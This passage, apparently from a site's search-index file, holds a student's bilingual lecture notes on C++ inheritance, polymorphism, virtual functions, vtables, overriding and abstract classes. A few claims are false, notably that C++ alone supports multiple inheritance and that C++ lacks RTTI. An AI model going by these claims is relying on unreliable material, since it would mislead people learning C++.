<li>\u7ee7\u627f\u7684\u53d8\u91cf\uff0c\u6700\u597d\u4f7f\u7528\u7ee7\u627f\u7684\u51fd\u6570\u6765\u64cd\u4f5c</li> <li>\u7236\u7c7b\u7684\u4e1c\u897f\u5728\u5b50\u7c7b\u4e2d\u90fd\u5b58\u5728\uff0c\u4f46\u5b50\u7c7b\u65e0\u6cd5\u76f4\u63a5\u4f7f\u7528\u7236\u7c7b\u4e2d\u7684 <code>private variable</code>\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 <code>public function</code> \u6765\u64cd\u4f5c</li> <li><code>name hide</code> (C++ \u4e2d\u7279\u6709\u7684)\uff0c\u7236\u7c7b\u4e2d\u91cd\u8f7d\u7684\u51fd\u6570\uff0c\u5982\u679c\u5728\u5b50\u7c7b\u4e2d\u91cd\u5199\u4e86\u5176\u4e2d\u7684\u4e00\u4e2a\u90a3\u4e48\u7236\u7c7b\u7684\u91cd\u8f7d\u51fd\u6570\u5728\u5b50\u7c7b\u4e2d\u90fd\u4e0d\u5b58\u5728\u4e86 (\u5982 main.cpp \u4e2d\u7684 <code>m.print(\"Manager\")</code> \u5c31\u662f\u9519\u8bef\u7684)</li> <li>\u7236\u7c7b\u7684 <code>protected variable</code> \u5728\u5b50\u7c7b\u4e2d\u76f8\u5f53\u4e8e\u5b50\u7c7b\u7684 <code>private variable</code></li> <li>\u5b50\u7c7b\u7684\u5730\u5740\u4e2d\uff0c\u7b2c\u4e00\u90e8\u5206\u5b58\u7684\u662f\u7236\u7c7b\u7684\u53d8\u91cf\uff0c\u7b2c\u4e8c\u90e8\u5206\u624d\u662f\u81ea\u5df1\u7684\uff0c\u6545\u4e00\u822c\u5148\u521d\u59cb\u5316\u7236\u7c7b\u5bf9\u8c61</li> <li>\u5f53\u7528\u5b50\u7c7b\u6765\u770b\u4f5c\u4e00\u4e2a\u7236\u7c7b\u7684\u5bf9\u8c61\uff0c\u53ea\u5bf9\u5b50\u7c7b\u5730\u5740\u524d\u9762\u7684\u90e8\u5206\u64cd\u4f5c\u5c31\u662f\u5bf9\u7236\u7c7b\u7684\u64cd\u4f5c</li> <li>Scpoes and access in C++ </li> </ul> <ul> <li><code>class B: public A</code> \u53ea\u6709 <code>public A</code> \u624d\u662f OOP \u8bed\u4e49\u4e0a\u7684\u7ee7\u627f</li> <li><code>class B: A</code> \u9ed8\u8ba4 <code>class B: private A</code> -&gt; <code>A</code> \u4e2d\u7684 <code>public</code> \u548c <code>protected</code> \u90fd\u53d8\u6210 <code>private</code></li> <li><code>class B: protected A</code> -&gt; <code>A</code> \u4e2d\u7684 <code>public</code> \u548c <code>protected</code> \u90fd\u53d8\u6210 <code>protected</code></li> </ul>"}, {"location": "Course/OOP/Lec06/#polymorphism", "title": "Polymorphism | \u591a\u6001\u6027", "text": "<p>\u4ece\u7ee7\u627f\u5f15\u7533\u51fa\u6765\u7684\u6982\u5ff5</p> <ul> <li>Public Inheritance should imply substitution<ul> <li>If B isa A (\u8868\u8fbe\u4e00\u79cd\u7ee7\u627f\u5173\u7cfb), you can use a B anywhere an A can be used<ul> <li>If B isa A, then everything that is true for A is also true for B</li> </ul> </li> <li>Be careful if the substition is not valid</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec06/#up-casting", "title": "Up-casting | \u5411\u4e0a\u9020\u578b", "text": "<ul> <li>Is to regard an object of the derived class as an object of the base class</li> <li>It is to say: Students are human beings. You are students. So you are human beings.</li> </ul> <pre><code>graph LR\n    A[HumanBeing] --&gt; B[Students]\n</code></pre> <ul> <li>Upcasting is the act of converting from a Derived reference or pointer to a Base class reference or pointer</li> </ul> <pre><code>graph LR\n    A[Base] --&gt; B[Derived]\n</code></pre> Upcasting examples <pre><code>Manager peter(\"Peter\", \"123-45-6789\", \"VP\");\nEmployee* e = &amp;peter;   // Upcasting\nEmployee&amp; e = peter;    // Upcasting\n</code></pre> <ul> <li>Lose type information about the object: <code>ep-&gt;print(cout); //prints base class version</code></li> </ul> code codeoutputinfo <pre><code>#include &lt;iostream&gt;\nusing namespace std;\nclass A\n{\npublic:\n    int i;\n    A(){ i = 10; cout &lt;&lt; \"A()\" &lt;&lt; i &lt;&lt; endl; }\n    void f() { cout &lt;&lt; \"A::f()\" &lt;&lt; endl; }\n};\nclass B : public A\n{\npublic:\n    int i;\n    B(){ i = 20; cout &lt;&lt; \"B()\" &lt;&lt; i &lt;&lt; endl; }\n    void f() { cout &lt;&lt; \"B::f()\" &lt;&lt; endl; }\n};\nint main()\n{\n    B b;\n    A *p = &amp;b;  // Upcasting\n    b.f();\n    p-&gt;f(); \n    cout &lt;&lt; sizeof(*p) &lt;&lt; endl;   \n    int *pi = (int*)p;  // Downcasting\n    cout &lt;&lt; pi[0] &lt;&lt; \",\" &lt;&lt; pi[1] &lt;&lt; endl;\n    cout &lt;&lt; p-&gt;i &lt;&lt; endl;\n    cout &lt;&lt; b.i &lt;&lt; endl;\n}\n</code></pre> <pre><code>A()10   # \u5148\u521d\u59cb\u5316\u7236\u7c7b\nB()20   # \u518d\u521d\u59cb\u5316\u5b50\u7c7b\nB::f()  # \u8c03\u7528\u5b50\u7c7b\u7684\u51fd\u6570\nA::f()  # \u8c03\u7528\u7236\u7c7b\u7684\u51fd\u6570\n4       # sizeof \u53d1\u751f\u5728\u7f16\u8bd1\u65f6\u671f\uff0c\u6b64\u65f6 *p \u662f A \u7c7b\u578b\uff0c\u6545\u4e3a 4\n10,20   # pi[0] \u662f A \u7c7b\u578b\u7684 i\uff0cpi[1] \u662f B \u7c7b\u578b\u7684 i\n10      # p \u662f A \u7c7b\u578b\uff0c\u6545 p-&gt;i \u662f A \u7c7b\u578b\u7684 i\n20      # b \u662f B \u7c7b\u578b\uff0c\u6545 b.i \u662f B \u7c7b\u578b\u7684 i\n</code></pre> QeustionSolution <ul> <li>\u9488\u5bf9 <code>b.f()</code> \u548c <code>p-&gt;f()</code></li> <li>A \u548c B \u4e2d\u6709\u76f8\u540c\u51fd\u6570\uff0c\u4f46\u662f\u8c03\u7528\u7684\u662f\u54ea\u4e2a\u51fd\u6570\uff0c\u53d6\u51b3\u4e8e\u6307\u9488\u7684\u7c7b\u578b</li> <li>\u5f53\u4f7f\u7528 <code>p-&gt;f()</code> \u65f6\uff0c<code>p</code> \u662f <code>A</code> \u7c7b\u578b\u7684\uff0c\u6545\u8c03\u7528\u7684\u662f <code>A</code> \u4e2d\u7684 <code>f()</code>\uff0c\u800c\u4e0d\u662f <code>B</code> \u4e2d\u7684 <code>f()</code></li> <li>\u5f53\u4f7f\u7528 <code>b.f()</code> \u65f6\uff0c<code>b</code> \u662f <code>B</code> \u7c7b\u578b\u7684\uff0c\u6545\u8c03\u7528\u7684\u662f <code>B</code> \u4e2d\u7684 <code>f()</code></li> </ul> <ul> <li>\u5728 A \u4e2d\u7684 <code>f()</code> \u524d\u52a0\u4e0a <code>virtual</code> \u5173\u952e\u5b57\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5b9e\u73b0\u591a\u6001\u6027 (\u5373 <code>virtual void f() { cout &lt;&lt; \"A::f()\" &lt;&lt; endl; }</code>)</li> <li>\u52a0\u4e86 <code>virtual</code> \u5173\u952e\u5b57\u540e\uff0c A \u548c B \u4e2d\u7684\u76f8\u540c\u51fd\u6570\u662f <code>override</code> \u7684\u5173\u7cfb\uff0c\u5373 B \u4e2d\u7684 <code>f()</code> \u8986\u76d6\u4e86 A \u4e2d\u7684 <code>f()</code></li> </ul> <ul> <li> <p>Polymorphism is based on <code>Upcast</code> and <code>Dynamic Binding</code></p> <ul> <li>Upcast: take an object of the derived class as an object of the base one</li> <li>Dynamic Binding (Binding -&gt; which function to be called): <ul> <li>Static Binding: call the function as the code</li> <li>Dynamic Binding: call the function of the object</li> </ul> </li> </ul> Example <pre><code>void render(Shape* p)\n{\n    p-&gt;render();    // calls correct render function\n}   // for given Shape!\nvoid func()\n{\n    Ellipse ell(10, 20);\n    ell.render();   // static -- Ellipse::render()\n\n    Circle cir(10);\n    cir.render();   // static -- Circle::render()\n\n    render(&amp;ell);   // dynamic -- Ellipse::render()\n    render(&amp;cir);   // dynamic -- Circle::render()\n}\n</code></pre> <ul> <li>\u5728 C++ \u4e2d\uff0c\u5f53\u4f7f\u7528\u57fa\u7c7b\u7684\u5f15\u7528\u6216\u6307\u9488\u8c03\u7528\u4e00\u4e2a <code>virtual function</code> \u65f6\uff0c\u53d1\u751f\u52a8\u6001\u7ed1\u5b9a</li> <li>\u4e0a\u8ff0\u4ee3\u7801\u4e2d <code>Shape* p</code> \u88ab\u79f0\u4e3a <code>polymorphic variable</code>\uff0c \u591a\u6001\u53d8\u91cf\u6709\u4e24\u79cd\u7c7b\u578b<ul> <li>Static type: \u58f0\u660e\u7c7b\u578b -&gt; \u5373 <code>Shape *</code></li> <li>Dynamic type: \u5b9e\u9645\u7c7b\u578b -&gt; \u8fd0\u884c\u65f6\u523b\u624d\u77e5\u9053\uff0c\u5373 <code>Ellipse</code> \u6216 <code>Circle</code></li> </ul> </li> </ul> Quote <p>C++\u4e2d\u7684\u52a8\u6001\u7c7b\u578b\u4e0e\u52a8\u6001\u7ed1\u5b9a\u3001\u865a\u51fd\u6570\u3001\u8fd0\u884c\u65f6\u591a\u6001</p> </li> </ul>"}, {"location": "Course/OOP/Lec06/#virtual-functions", "title": "Virtual functions", "text": "<ul> <li>Non-virtual functions<ul> <li>Compiler generates <code>static</code>, or direct call to stated type</li> <li>Faster to execute</li> </ul> </li> <li>Virtual functions<ul> <li>Can be transparently overriden in a derived class</li> <li>Objects carry a pack of their virtual functions</li> <li>Compiler checks pack and dynamically calls the right function</li> <li>If compiler knows the functions at compile time, it will generate a static call</li> </ul> </li> <li> <p>Calls up the chain \uff08\u5982\u4f55\u5728\u5b50\u7c7b\u4e2d\u8c03\u7528\u7236\u7c7b\u51fd\u6570\uff09\u2014\u2014 use <code>Base::f()</code> </p> <ul> <li>No need to copy the old stuff!</li> </ul> code <pre><code>void Derived::f()\n{\n    Base::f();  // call to base class\n}\n</code></pre> </li> </ul> <p>How virtuals work in C++</p> \u7236\u7c7b\u4e2d\u5b50\u7c7b\u4e2dExplanationProve code\u5206\u5e03 <pre><code>class Shape{\npublic:\n    Shape();\n    virtual ~Shape();\n    virtual void render();\n    void move(const XYPos&amp;);\n    virtual void resize();\nprotected:\n    XYPos center;\n};\n</code></pre> <p></p> code\u5206\u5e03 <pre><code>class Ellipse: public Shape{\npublic:\n    Ellipse (float majr, float minr);\n    virtual void render();\nprotected:\n    float major_axis;\n    float minor_axis;\n}\n</code></pre> <p></p> <ul> <li>\u4efb\u4f55\u4e00\u4e2a\u6709 <code>virtual</code> \u7c7b\u7684\u5bf9\u8c61\uff0c\u5728\u5bf9\u8c61\u91cc\u9762\u7b2c\u4e00\u4e2a\u6210\u5458\u662f\u4e00\u4e2a\u6307\u9488( <code>VPTR</code>\uff0c8 \u4e2a\u5b57\u8282(\u5bf9 64 \u4f4d OS) )\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u4e00\u4e2a\u8868 ( <code>vtable</code> )</li> <li><code>vtable</code> \u4e2d\u5b58\u653e\u8fd9\u4e2a\u7c7b\u4e2d\u6240\u6709 <code>virtual</code> \u51fd\u6570\u7684\u5730\u5740</li> <li><code>vtable</code> \u662f\u9759\u6001\u7684\uff0c</li> </ul> codeOutput <pre><code>#include &lt;iostream&gt;\nusing namespace std;\nclass A\n{\npublic:\n    int i;\n    A(){ i = 10; cout &lt;&lt; \"A()\" &lt;&lt; i &lt;&lt; endl; }\n    virtual void f() { cout &lt;&lt; \"A::f()\" &lt;&lt; endl; }\n};\nclass B : public A\n{\npublic:\n    int i;\n    B(){ i = 20; cout &lt;&lt; \"B()\" &lt;&lt; i &lt;&lt; endl; }\n    void f() { cout &lt;&lt; \"B::f()\" &lt;&lt; endl; }\n};\nint main()\n{\n    B b;\n    A *p = &amp;b;  // Upcasting\n\n    long long **vp = (long long**)p;\n    void (*pf)() = (void (*)())(*(*vp));\n    cout &lt;&lt; \"------\" &lt;&lt; endl;\n    pf();\n}\n</code></pre> <pre><code>A()10\nB()20\n------\nB::f()\n</code></pre> <ul> <li><code>p</code> \u6307\u5411 <code>VPTR</code>, <code>*p</code> \u6307\u5411 <code>vtable</code></li> <li><code>**p</code> \u8868\u793a <code>vtable</code> \u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5373 <code>(*f)()</code></li> </ul> <p>\u5f15\u7533</p> codeOutput <pre><code>...\nclass A\n{\npublic:\n    int i;\n    A(){ i = 10; cout &lt;&lt; \"A()\" &lt;&lt; i &lt;&lt; endl; f(); }\n    virtual void f() { cout &lt;&lt; \"A::f()\" &lt;&lt; endl; }\n    void g() {this-&gt;f();}\n};\n...\nint main()\n{\n    B b;\n    A *p = &amp;b;\n    p-&gt;g();\n}\n</code></pre> <pre><code>A()10\nA::f()\nB()20\nB::f()\n</code></pre> <ul> <li>\u6b64\u65f6 <code>A()</code> \u4e2d\u8c03\u7528\u7684 <code>f()</code> \u662f A \u4e2d\u7684 <code>f()</code></li> <li><code>g()</code> \u4e2d\u8c03\u7528\u7684 <code>f()</code> \u662f B \u4e2d\u7684 <code>f()</code></li> <li>\u5728\u6784\u9020\u51fd\u6570\u4e2d \u201c\u770b\u8d77\u6765 virtual \u4e0d\u8d77\u4f5c\u7528\u4e86\u201d<ul> <li>Actually <code>VPTR</code> \u662f\u7531\u7f16\u8bd1\u5668\u5728\u6784\u9020\u51fd\u6570\u521a\u5f00\u59cb\u7684\u65f6\u5019\u88ab\u5199\u5165\uff0c<code>vtable</code> \u662f\u5728\u94fe\u63a5\u65f6\u5206\u914d\u597d\u5730\u5740</li> <li>\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\u5728\u6267\u884c\u65f6\u4f1a\u628a\u7236\u7c7b \u7684 <code>VPTR</code> \u586b\u5165 (\u5373 A \u7684\u6784\u9020\u51fd\u6570\u4e2d <code>f()</code> \u8fd8\u662f\u52a8\u6001\u7ed1\u5b9a)</li> <li>\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\u53d1\u751f\u65f6\u518d\u628a\u5b50\u7c7b\u7684 <code>VPTR</code> \u5199\u5165</li> </ul> </li> </ul> <ul> <li> <p>What happens if</p> <pre><code>Ellipse elly(10F, 20F);\nCircle circ(30F);\nelly = circ;\n</code></pre> <ul> <li>Area of <code>circ</code> is sliced off (Only the part of <code>circ</code> that fits in <code>elly</code> gets copied)</li> <li>\u4f46 <code>VPTR</code> \u5e76\u672a\u6539\u53d8 -&gt; <code>VPTR</code> \u6784\u9020\u51fa\u540e\u5c31\u4e0d\u4f1a\u518d\u6539\u53d8 (\u9664\u975e\u66b4\u529b\u4fee\u6539)</li> </ul> </li> <li> <p>Virtuals and reference arguments</p> <pre><code>void func(Ellipse&amp; elly)\n{\n    elly.render();  // \u52a8\u6001\u7ed1\u5b9a\n}\n...\nCircle circ(10F);\nfunc(circ);\n</code></pre> <ul> <li>References act like pointers</li> </ul> </li> <li> <p>Virtual destructors</p> <ul> <li>Make destructors virtual if they might be inherited</li> </ul> codeExplanation <pre><code>Shape *p = new Ellipse(10.0F, 20.0F);\n\u00b7\u00b7\u00b7\ndelete p;   // \u5148\u6790\u6784\uff08\u8c03\u7528 destructor\uff09\u518d\u56de\u6536\u5185\u5b58\n</code></pre> <ul> <li><code>delete p;</code> \u505a\u7684\u4e24\u4ef6\u4e8b\u60c5<ol> <li><code>p-&gt;destructor();</code> -&gt; \u5b58\u5728\u7ed1\u5b9a\u95ee\u9898, \u82e5 p \u7684\u9759\u6001\u7c7b\u578b\uff08Shape\uff09\u7684\u6790\u6784\u51fd\u6570\u4e0d\u662f <code>virtual</code> \u5219\u53ea\u5728\u6b64\u5904\u6267\u884c\u9759\u6001\u7ed1\u5b9a\uff0c\u53ea\u6267\u884c <code>Shape</code> \u7c7b\u7684\u6790\u6784(\u4f46\u5b9e\u9645 p \u6307\u5411\u7684\u5bf9\u8c61\u662f <code>Ellipse</code>, \u6b64\u65f6 <code>Ellipse</code> \u7684\u6790\u6784\u672a\u505a)\uff1b\u4f46\u82e5\u662f <code>virtual</code> \u7f16\u8bd1\u5668\u4f1a\u5728\u6b64\u5904\u52a8\u6001\u7ed1\u5b9a\uff0c\u624d\u4f1a\u505a\u6709\u6548\u7684\u6790\u6784</li> <li><code>free</code> </li> </ol> </li> <li>[Note] : \u9664\u975e\u4fdd\u8bc1\u81ea\u5df1\u7684\u7c7b\u4e0d\u4f1a\u88ab\u7ee7\u627f\uff0c\u5c31\u5c06\u7c7b\u7684\u6790\u6784\u51fd\u6570\u8bbe\u7f6e\u4e3a <code>virtual</code> -&gt; \u8fd9\u4e2a\u7c7b\u5c31\u4f1a\u6709 <code>VPTR</code> \u548c <code>vtable</code></li> <li>\u90a3\u4e48\u5176\u5b9e c++ \u7684\u6bcf\u4e2a\u7c7b\u90fd\u5e94\u8be5\u6709 <code>vtable</code> -&gt; \u901a\u8fc7 <code>VPTR</code> \u548c <code>vtable</code> \u7684\u5173\u7cfb\uff0c\u6211\u4eec\u5efa\u7acb\u4e86\u4e00\u79cd\u5bf9\u8c61\u548c\u7c7b\u4e4b\u95f4\u7684\u5173\u8054 \u2014\u2014 \u53ef\u4ee5\u5b9e\u73b0 RTTI (Run Time Type Identification) | \u4f46 c++ \u6682\u4e0d\u652f\u6301 RTTI </li> </ul> <ul> <li>Want <code>Ellipse::~Ellipse()</code> to be called<ul> <li>Must declare <code>Shape::~Shape()</code> virtual</li> <li>It will call <code>Shape::~Shape()</code> automatically</li> </ul> </li> <li>If <code>Shape::~Shape</code> is not virtual, only <code>Shape::~Shape()</code> will be invoked</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec06/#overriding", "title": "Overriding", "text": "<ul> <li> <p>overriding redefines the body of a virtual function</p> <ul> <li>\u6307\u5b50\u7c7b\u548c\u7236\u7c7b\u6709\u540c\u540d\u51fd\u6570\uff08\u51fd\u6570\u540d\u79f0\u76f8\u540c\u3001\u53c2\u6570\u8868\u4e5f\u76f8\u540c\uff0c\u4e14\u7236\u7c7b\u4e2d\u58f0\u660e <code>virtual</code>\uff09</li> </ul> <pre><code>class Base\n{\npublic:\n    virtual void f();\n}\nclass Derived : public Base\n{\npublic:\n    virtual void f();\n    // override Base::f()\n}\n</code></pre> <ul> <li>\u7236\u7c7b\u4e2d\u6709 <code>virtual</code>, \u5b50\u7c7b\u53ef\u4ee5\u4e0d\u52a0 <code>virtual</code>. \u4f46\u4e60\u60ef\u4e0a\u8fd8\u662f\u52a0\u4e0a <code>virtual</code>\uff0c\u4ee5\u514d\u5b50\u7c7b\u7684\u7ee7\u627f\u8005\u5fd8\u8bb0\u52a0\u4e0a <code>virtual</code> \u5bfc\u81f4\u65e0\u6cd5\u52a8\u6001\u7ed1\u5b9a (\u8c8c\u4f3c\u5e76\u4e0d\u9700\u8981\uff0c\u6d4b\u8bd5\u4e86\u4e00\u4e0b\uff0c\u4e0d\u52a0 <code>virtual</code> \u4e5f\u53ef\u4ee5\u52a8\u6001\u7ed1\u5b9a)</li> </ul> </li> </ul> Overloading vs. Overriding <ul> <li>Overloading<ul> <li>\u5728\u4e00\u4e2a\u5c42\u7ea7\u4e0a\uff0c\u5747\u5728\u5b50\u7c7b or \u7236\u7c7b or free \u51fd\u6570\u4e2d\u6709\u540c\u540d\u51fd\u6570\uff08\u51fd\u6570\u540d\u79f0\u76f8\u540c\uff0c\u53c2\u6570\u8868\u4e0d\u540c\uff09</li> </ul> </li> <li>Overriding<ul> <li>\u6307\u5b50\u7c7b\u548c\u7236\u7c7b\u6709\u540c\u540d\u51fd\u6570\uff08\u51fd\u6570\u540d\u79f0\u76f8\u540c\u3001\u53c2\u6570\u8868\u4e5f\u76f8\u540c\uff0c\u4e14\u7236\u7c7b\u4e2d\u58f0\u660e <code>virtual</code>\uff09</li> <li>\u8fd4\u56de\u7c7b\u578b\u4e5f\u8981\u6c42\u76f8\u540c\uff0c\u4f46\u53ef\u4ee5\u662f\u7236\u7c7b\u8fd4\u56de\u7c7b\u578b\u7684\u5b50\u7c7b\u578b</li> </ul> </li> </ul> <p>Name</p> <p>\u7236\u7c7b\u4e2d\u53d1\u751f\u91cd\u8f7d\uff0c\u6bd4\u5982\u7236\u7c7b\u4e2d\u6709\u591a\u4e2a <code>virtual</code> \u7684\u51fd\u6570 <code>func()</code>, \u800c\u5b50\u7c7b\u53ea override \u4e86\u5176\u4e2d\u7684\u4e00\u4e2a\u3002\u90a3\u4e48\u5176\u4f59\u7684\u91cd\u8f7d\u51fd\u6570\u4fbf\u4e0d\u5728\u5b50\u7c7b\u5b58\u5728\u4e86 | Name Hiding</p> code <pre><code>class Expr\n{\npublic:\n    virtual Expr* new_expr();\n    virtual Expr&amp; clone();\n    virtual Expr  self();\n};\nclass Binary : public Expr\n{\npublic:\n    virtual Binary* new_expr(); // OK\n    virtual Binary&amp; clone();    // OK\n    virtual Binary  self();     // Error\n};\n</code></pre> <ul> <li>\u7236\u7c7b\u8fd4\u56de\u7c7b\u578b\u662f pointer or reference \u7684\u65f6\u5019\uff0c\u5b50\u7c7b\u53ef\u4ee5\u662f\u7236\u7c7b\u8fd4\u56de\u7c7b\u578b\u7684\u5b50\u7c7b\u578b</li> <li>\u4f46\u7236\u7c7b\u8fd4\u56de\u7c7b\u578b\u662f\u5bf9\u8c61\u672c\u8eab\u7684\u65f6\u5019\uff0c\u5b50\u7c7b\u8fd4\u56de\u7c7b\u578b\u4e0d\u80fd\u662f\u5b50\u7c7b\u7684\uff08\u4f1a\u88ab sliced off\uff09</li> </ul> Quote <p>CSDN - c++ Why name hiding</p> <p>Tips</p> <ul> <li> <p>Never redefine an inherited non-virtual function</p> <ul> <li>Non-virtual functions are statically bound</li> <li>No dynamic dispatch</li> </ul> </li> <li> <p>Never redefine an inherited default parameter value</p> <ul> <li>\u9ed8\u8ba4\u53c2\u6570\u53ea\u662f\u51fa\u73b0\u5728\u5934\u6587\u4ef6\u4e2d\uff0c\u4e0d\u662f\u9759\u6001\u7ed1\u5b9a\uff08\u82e5\u5728\u5b50\u7c7b\u4e2d\u4fee\u6539\uff0c\u7ed3\u679c\u4e0d\u4e00\u5b9a\u7b26\u5408\u9884\u671f\uff09</li> </ul> Example <pre><code>class Base\n{\npublic:\n    virtual void f(int x = 0);\n};\nclass Derived : public Base\n{\npublic:\n    void f(int x = 1);  \n};\n\u00b7\u00b7\u00b7\nvoid func(Base&amp; b)\n{\n    b.f();  // output 0\n}\nint main()\n{\n    Derived d;\n    func(d);\n}\n</code></pre> <ul> <li>\u867d\u7136\u9884\u671f\u662f\u4f20\u8fdb\u53bb\u5b50\u7c7b\uff0c\u5e94\u8be5\u6253\u5370 1\uff0c\u4f46\u7531\u4e8e\u7f16\u8bd1\u5668\u5728\u7f16\u8bd1 <code>func</code> \u7684\u65f6\u5019\u89c1\u5230\u7684\u662f\u9759\u6001\u7ed1\u5b9a\u7684 <code>Base</code> \u7c7b\u578b\uff0c\u8fd8\u662f\u4f1a\u6253\u5370 0</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec06/#abstract-base-classes", "title": "Abstract base classes", "text": "<ul> <li>An abstract base class has pure virtual functions | \u7eaf\u865a\u51fd\u6570<ul> <li>Only interface defined</li> <li>No function body given</li> </ul> </li> <li>Abstract base classes cannot be instantiated | \u4e0d\u80fd\u88ab\u5b9e\u4f8b\u5316<ul> <li>Must derive a new class/classes</li> <li>Must supply definitions for all pure virtuals before class can be instantiated</li> </ul> </li> </ul> codeexplanation <pre><code>class XYPos { \u00b7\u00b7\u00b7 }; // x, y point\nclass Shape\n{\npublic:\n    Shape();\n    virtual void draw() = 0;  // pure virtual fucntion\n    void move(const XYPos&amp;);\n    virtual void resize();\nprotected:\n    XYPos center;\n};\nclass Circle : public Shape\n{\npublic:\n    virtual void draw();     // override\n    \u00b7\u00b7\u00b7\n};\nclass Rectangle : public Shape\n{\npublic:\n    virtual void draw();     // override\n    \u00b7\u00b7\u00b7\n};\n</code></pre> <ul> <li><code>virtual function() = 0;</code> \u5373\u53ef\u5c06\u6b64\u51fd\u6570\u6807\u8bb0\u4e3a \u7eaf\u865a\u51fd\u6570 | pure virtual function</li> <li>\u4e00\u65e6\u4e00\u4e2a\u7c7b\u4e2d\u6709\u4e00\u4e2a\u7eaf\u865a\u51fd\u6570\uff0c\u8fd9\u4e2a\u7c7b\u5c31\u79f0\u4e3a\u62bd\u8c61\u7c7b\uff08\u4e0d\u80fd\u7528\u4e8e\u5236\u9020\u5bf9\u8c61\uff09</li> <li><code>Shape</code> \u7684\u5b58\u5728\u662f\u4e3a\u4e86\u8ba9 <code>Circle</code> \u548c <code>Rectangle</code> \u7ee7\u627f\uff0c\u63d0\u4f9b\u4e00\u4e2a\u5171\u540c\u7684\u63a5\u53e3</li> </ul> <ul> <li>Why use<ul> <li>Modeling</li> <li>Force correct behavior</li> <li>Define interface without defining implementation</li> </ul> </li> <li>When use<ul> <li>Not enough information is available</li> <li>When designing for interf inheritance</li> </ul> </li> <li>Protocol/Interface classes are abstract base classes with<ul> <li>All non-static member functions are pure virtual except for the destructor</li> <li>Virtual destructor with empty body</li> <li>No non-static member variables, inherited or otherwise<ul> <li>May contain static members</li> </ul> </li> <li>\u5373\u7ee7\u627f\u5b50\u7c7b\u5b9e\u73b0\u63a5\u53e3\u7684\u89c4\u8303\u7684\u516c\u5f00\u51fd\u6570\uff0c\u4f46\u63a5\u53e3\u5e76\u4e0d\u63d0\u4f9b\u4efb\u4f55\u51fd\u6570\u7684\u5b9e\u73b0</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec06/#multiple-inheritance", "title": "Multiple Inheritance", "text": "<p>C++ \u662f\u552f\u4e00\u652f\u6301\u591a\u7ee7\u627f\u7684\u8bed\u8a00</p> codeexplanation <pre><code>class Employee\n{\nprotected:\n    string name;\n    EmpID id;\n}\nclass MTS : public Employee\n{\nprotected:\n    Degrees degree_info;\n};\nclass Consultant : public MTS, public Temporary\n{\n    \u00b7\u00b7\u00b7\n};\n</code></pre> <ul> <li><code>Consultant</code> picks up the attributes of both <code>MTS</code> and <code>Temporary</code><ul> <li><code>name, id, employer, degree_info</code></li> </ul> </li> <li>\u6ce8\u610f\u7ee7\u627f\u7236\u7c7b\u7528\u9017\u53f7\u9694\u5f00\uff0c\u4e14\u6bcf\u4e00\u4e2a\u7236\u7c7b\u524d\u9762\u90fd\u8981\u52a0 <code>public</code> \u8868\u793a\u7ee7\u627f\u591a\u4e2a\u7236\u7c7b\u7684 <code>public</code></li> <li>\u591a\u6001\u7ee7\u627f\u7684\u51fa\u73b0\u662f\u4e3a\u4e86\u89e3\u51b3 C++ \u6ca1\u6709\u5355\u6839\u7ed3\u6784\u7684\u95ee\u9898</li> </ul> \u591a\u7ee7\u627f\u7684\u95ee\u9898 <p></p> <ol> <li>\u5bf9\u4e8e\u7236\u7c7b A, \u5176\u6709\u4e24\u4e2a\u5b50\u7c7b B \u548c C, D \u6709\u540c\u65f6\u7ee7\u627f B \u548c C</li> <li>\u6b64\u65f6\u82e5 A \u4e2d\u6709\u4e00\u53d8\u91cf i\uff0cD \u8c03\u7528 i \u65f6\uff0c\u4f1a\u51fa\u73b0\u4e8c\u4e49\u6027\uff0c\u5373\u4e0d\u77e5\u9053\u662f\u8c03\u7528 B \u4e2d\u7684 i \u8fd8\u662f C \u4e2d\u7684 i</li> </ol> <ul> <li>\u4e3a\u4e86\u89e3\u51b3\u6b64\u95ee\u9898\uff0cC++ \u63d0\u51fa\u865a\u7ee7\u627f\uff08virtual public\uff09\uff0c\u6bd4\u5982 B \u548c C \u865a\u7ee7\u627f A\uff0c\u90a3\u4e48\u5c06\u4e0d\u4f1a\u628a A \u4e2d\u7684\u53d8\u91cf\u94fe\u63a5\u5230 B \u548c C \u4e2d\u800c\u662f B \u6307\u5411\u4e00\u4e2a A\uff0cC \u6307\u5411\u4e00\u4e2a A\uff0c\u8fd9\u6837 D \u4e2d\u7684 B \u548c C \u4f1a\u6307\u5411\u540c\u4e00\u4e2a A\uff0c\u5c31\u4e0d\u4f1a\u51fa\u73b0\u4e8c\u4e49\u6027\u4e86</li> <li>\u540e\u6765\u63d0\u51fa\u7684 <code>\u6a21\u677f</code> \u662f\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848 \u2014\u2014 \u4e0d\u8981\u4f7f\u7528\u591a\u7ee7\u627f\\</li> </ul> Quote <p>\u865a\u7ee7\u627f\u548c\u865a\u57fa\u7c7b</p>"}, {"location": "Course/OOP/Lec07/", "title": "Copy Ctor &amp; Overloaded Operators | \u62f7\u8d1d\u6784\u9020\u4e0e\u91cd\u8f7d\u8fd0\u7b97\u7b26", "text": "<p> \u7ea6 1711 \u4e2a\u5b57  212 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"}, {"location": "Course/OOP/Lec07/#copy-ctor", "title": "Copy Ctor | \u62f7\u8d1d\u6784\u9020", "text": "\u4e00\u9053\u9898 \u9898\u76ee\u7b54\u6848 <p>For the code below <pre><code>void f()\n{\n    Stash students();\n    \u00b7\u00b7\u00b7\n}\n</code></pre> which statement is RIGHT for the line in the function <code>f()</code>? 1. This is a variable definition, while students is an object of Stash, initialized with the default constructor. 2. This is a function prototype, while students is a function returns an object of Stash. 3. This is a function call. 4. This is illegal in C++.</p> <ol> <li>false : \u6784\u9020\u5bf9\u8c61\u5982\u679c\u6ca1\u6709\u53c2\u6570\uff0c\u4e0d\u80fd\u52a0\u62ec\u53f7</li> <li>true : 